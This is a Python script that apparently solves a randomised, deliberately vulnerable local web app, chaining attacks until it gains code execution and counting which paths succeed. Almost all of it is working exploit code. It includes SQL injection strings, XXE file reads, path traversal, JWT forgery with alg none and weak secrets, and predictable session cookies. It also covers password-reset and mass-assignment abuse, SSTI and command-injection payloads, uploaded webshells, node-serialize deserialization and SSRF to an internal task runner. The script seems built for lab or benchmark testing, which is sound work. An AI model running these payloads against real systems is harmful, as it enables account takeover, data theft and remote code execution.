import urllib.request as U, urllib.parse, urllib.error, json, hmac, hashlib, base64, time, re, subprocess, sys
ROOT = "http://127.0.0.1:8092"; API = ROOT + "/api"
ADM = "root_admin"

def raw(method, p, body=None, headers=None):
    h = dict(headers or {})
    data = None
    if body is not None:
        if isinstance(body, (dict, list)): data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
        else: data = body.encode()
    r = U.Request(API + p, data=data, headers=h, method=method)
    try: x = U.urlopen(r, timeout=15); return x.status, x.read().decode(), dict(x.headers)
    except urllib.error.HTTPError as e: return e.code, e.read().decode(), dict(e.headers)
    except Exception as e: return 0, str(e), {}
def get(p, headers=None): return raw("GET", p, None, headers)
def post(p, body=None, headers=None): return raw("POST", p, body, headers)
def jparse(t):
    try: return json.loads(t)
    except: return None

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
def forge_hs256(secret, payload):
    hd = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()); pl = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return (hd + b"." + pl + b"." + b64u(hmac.new(secret.encode(), hd + b"." + pl, hashlib.sha256).digest())).decode()
def forge_none(payload):
    hd = b64u(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()); pl = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return (hd + b"." + pl + b".").decode()

INJ = "' UNION SELECT 999,username,password FROM users WHERE username='" + ADM + "'-- "

def manifest():
    s, t, _ = get("/manifest"); m = jparse(t) or {}
    eps = {}
    for v in m.get("views", []):
        for e in v.get("endpoints", []):
            eps.setdefault(e["kind"], []).append(e["p"])
    return m, eps

def get_user_cred(eps, auth):
    """register + login a normal user -> auth header for a low-priv foothold"""
    for rp in eps.get("register", []):
        un = "u" + str(int(time.time() * 1000) % 1000000)
        post(rp, {"username": un, "password": "pw12345"})
        for lp in eps.get("login", []):
            s, t, h = post(lp, {"username": un, "password": "pw12345"}); c = cred_from_login(auth, t, h)
            if c: return c
    return None

def gather(eps, auth):
    """return dict of leaked facts: password, appkey, adminkey, sid"""
    facts = {}
    # BOLA-read via a normal-user foothold (multi-hop: register -> login -> read admin record)
    lookups = eps.get("user-lookup", [])
    if lookups:
        uc = get_user_cred(eps, auth)
        if uc:
            for lp in lookups:
                s, t, _ = get(lp.replace(":username", ADM), uc); d = jparse(t)
                if isinstance(d, dict):
                    if d.get("password"): facts["password"] = d["password"]
                    if d.get("apikey"): facts["adminkey"] = facts.get("adminkey") or d["apikey"]
    # SQLi via search
    for p in eps.get("search", []):
        s, t, _ = get(p + "?q=" + urllib.parse.quote(INJ)); rows = jparse(t)
        if isinstance(rows, list):
            for r in rows:
                if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
    # XXE via import
    for p in eps.get("import", []):
        for tgt, key in [("file:///app/config/app.conf", "conf"), ("file:///app/secret/app.key", "appkey")]:
            xml = '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "%s">]><invoice><customer>&x;</customer></invoice>' % tgt
            s, t, _ = post(p, {"xml": xml}); d = jparse(t)
            leak = (d or {}).get("imported", {}).get("customer", "") if isinstance(d, dict) else ""
            if leak:
                mm = re.search(r'admin\.password=(\S+)', leak);  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
                if key == "appkey" and leak.strip() and "password" not in leak: facts["appkey"] = leak.strip()
    # LFI via read
    for p in eps.get("read", []):
        s, t, _ = get(p + "?name=" + urllib.parse.quote("../secret/app.key"))
        if s == 200 and t.strip() and "not found" not in t: facts["appkey"] = t.strip()
        s, t, _ = get(p + "?name=" + urllib.parse.quote("../config/app.conf"))
        mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        s, t, _ = get(p + "?name=" + urllib.parse.quote("../sessions.json"))
        arr = jparse(t)
        if isinstance(arr, list):
            for pair in arr:
                if isinstance(pair, list) and len(pair) == 2 and pair[1] == ADM: facts["sid"] = pair[0]
    # disclosure
    for p in eps.get("docs", []):
        s, t, _ = get(p); d = jparse(t) or {}
        xi = d.get("x-internal") or {}
        if xi.get("signingKey"): facts["appkey"] = xi["signingKey"]
        mm = re.search(r'admin\.password=(\S+)', xi.get("config", "") or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        if d.get("x-admin-key"): facts["adminkey"] = d["x-admin-key"]
    for p in eps.get("backup-file", []):
        s, t, _ = get(p)
        mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        mk = re.search(r'SIGNING_KEY=(\S+)', t or "");  facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
    return facts

def cred_from_login(auth, resp_text, resp_headers):
    d = jparse(resp_text) or {}
    if auth == "jwt" and d.get("token"): return {"Authorization": "Bearer " + d["token"]}
    if auth == "apikey" and d.get("apiKey"): return {"X-API-Key": d["apiKey"]}
    if auth == "session":
        sc = resp_headers.get("Set-Cookie", "");  m = re.search(r'mutie_sid=([^;]+)', sc)
        if m: return {"Cookie": "mutie_sid=" + m.group(1)}
    return None

def admin_creds(eps, auth, facts):
    """yield candidate admin auth-header dicts — HARDER paths first (coverage)"""
    cands = []
    pw = facts.get("password")
    # jwt forge / algnone / weak
    if auth == "jwt":
        payload = {"username": ADM, "role": "admin", "exp": int(time.time()) + 3600}
        if facts.get("appkey"): cands.append(("jwt-forge", {"Authorization": "Bearer " + forge_hs256(facts["appkey"], payload)}))
        cands.append(("jwt-algnone", {"Authorization": "Bearer " + forge_none({"username": ADM, "role": "admin"})}))
        cands.append(("jwt-weak", {"Authorization": "Bearer " + forge_hs256("secret", payload)}))
    if auth == "session":
        cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
        if facts.get("sid"): cands.append(("session-file", {"Cookie": "mutie_sid=" + facts["sid"]}))
    if auth == "apikey" and facts.get("adminkey"):
        cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
    # login SQLi bypass
    for p in eps.get("login", []):
        for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
            s, t, h = post(p, {"username": inj, "password": "x"}); c = cred_from_login(auth, t, h)
            if c: cands.append(("login-bypass", c))
    # reset-weak then login
    for rp in eps.get("reset", []):
        post(rp, {"username": ADM})
        for cp in eps.get("reset-confirm", []):
            s, t, h = post(cp, {"username": ADM, "token": "rt-" + ADM, "password": "pwned123"})
            if s == 200:
                for lp in eps.get("login", []):
                    s2, t2, h2 = post(lp, {"username": ADM, "password": "pwned123"}); c = cred_from_login(auth, t2, h2)
                    if c: cands.append(("reset-weak", c))
    # mass-assignment register admin then login
    for rp in eps.get("register", []):
        un = "pwn" + str(int(time.time() * 1000) % 100000)
        post(rp, {"username": un, "password": "pw12345", "role": "admin"})
        for lp in eps.get("login", []):
            s, t, h = post(lp, {"username": un, "password": "pw12345"}); c = cred_from_login(auth, t, h)
            if c: cands.append(("mass-assign", c))
    # login with recovered password (easiest — last)
    for p in eps.get("login", []):
        if pw:
            s, t, h = post(p, {"username": ADM, "password": pw}); c = cred_from_login(auth, t, h)
            if c: cands.append(("creds-login", c))
    return cands

def try_sinks(eps, hdr):
    # ssti
    for p in eps.get("render", []):
        s, t, _ = post(p, {"template": "{{ process.mainModule.require('child_process').execSync('id') }}", "data": {}}, hdr)
        d = jparse(t)
        if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "ssti"
    # cmdi
    for p in eps.get("backup", []):
        s, t, _ = post(p, {"name": "x.tgz; id #"}, hdr); d = jparse(t)
        if isinstance(d, dict) and "uid=" in str(d.get("log", "")): return "cmdi"
    # upload webshell — try both variants: js-require and ejs-template
    if eps.get("upload") and eps.get("run"):
        payloads = [("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"),
                    ("t.ejs", "<%= process.mainModule.require('child_process').execSync('id') %>")]
        for up in eps["upload"]:
            base = up.rsplit("/", 1)[0]
            for fn, content in payloads:
                post(up, {"filename": fn, "content": content}, hdr)
                for rp in eps["run"]:
                    if rp.startswith(base):
                        s, t, _ = post(rp.replace(":name", fn), {}, hdr); d = jparse(t)
                        if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "upload"
    # deserialization
    for p in eps.get("import-job", []):
        payload = json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"})
        s, t, _ = post(p, {"job": payload}, hdr); d = jparse(t)
        if isinstance(d, dict) and "uid=" in str(d.get("result", "")): return "deser"
    return None

def try_ssrf(eps):
    for p in eps.get("fetch", []):
        s, t, _ = post(p, {"url": "http://127.0.0.1:9000/token"}); d = jparse(t)
        if isinstance(d, dict) and d.get("status") == 200:
            tok = (jparse(d["body"]) or {}).get("token")
            if tok:
                s2, t2, _ = post(p, {"url": "http://127.0.0.1:9000/run-task", "method": "POST", "headers": {"Content-Type": "application/json", "X-Task-Token": tok}, "body": {"cmd": "id"}}); d2 = jparse(t2)
                if isinstance(d2, dict) and d2.get("status") == 200 and "uid=" in (jparse(d2["body"]) or {}).get("output", ""): return "ssrf->run-task"
    return None

def solve():
    m, eps = manifest(); auth = m.get("auth")
    facts = gather(eps, auth)
    for how, hdr in admin_creds(eps, auth, facts):
        sink = try_sinks(eps, hdr)
        if sink: return True, auth, how, sink
    p = try_ssrf(eps)
    if p: return True, auth, "ssrf", p
    return False, auth, None, None

def wait_ready(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        s, t, _ = get("/manifest")
        if s == 200 and jparse(t):
            return True
        time.sleep(0.4)
    return False

if __name__ == "__main__":
    N = int(sys.argv[1]) if len(sys.argv) > 1 else 12
    ok = 0; ways = {}; sinks = {}
    for i in range(N):
        if i > 0:
            subprocess.run(["docker", "restart", "mu"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            wait_ready()
        s, t, _ = get("/manifest"); m = jparse(t) or {}
        success, auth, how, sink = solve()
        ok += 1 if success else 0
        if success: ways[how] = ways.get(how, 0) + 1; sinks[sink] = sinks.get(sink, 0) + 1
        print(f"  [{'OK  ' if success else 'FAIL'}] seed={m.get('seed')} auth={auth}  via {how} -> {sink}")
    print(f"\n  blind RCE solved: {ok}/{N} restarts")
    print("  admin-reach paths that fired:", ways)
    print("  RCE sinks that fired       :", sinks)
